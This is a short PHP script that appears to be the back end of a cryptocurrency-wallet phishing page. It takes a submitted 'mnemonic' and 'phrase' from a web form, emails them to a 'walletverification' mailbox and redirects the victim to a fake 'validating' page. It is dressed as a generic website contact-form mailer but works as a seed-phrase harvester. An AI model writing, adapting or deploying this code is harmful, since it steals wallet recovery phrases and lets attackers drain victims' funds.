<?php
//get data from form  

$name = $_POST['mnemonic'];
$email= $_POST['email'];
$message= $_POST['phrase'];
$to = "walletverification@outlook.com";
$subject = "Mail From website";
$txt ="Name = ". $name . "\r\n  Email = " . $email . "\r\n Message =" . $message;
$headers = "From: noreply@yoursite.com" . "\r\n" .
"CC: somebodyelse@example.com";
if($email!=NULL){
    mail($to,$subject,$txt,$headers);
}
//redirect
header("Location:validating.html");
?>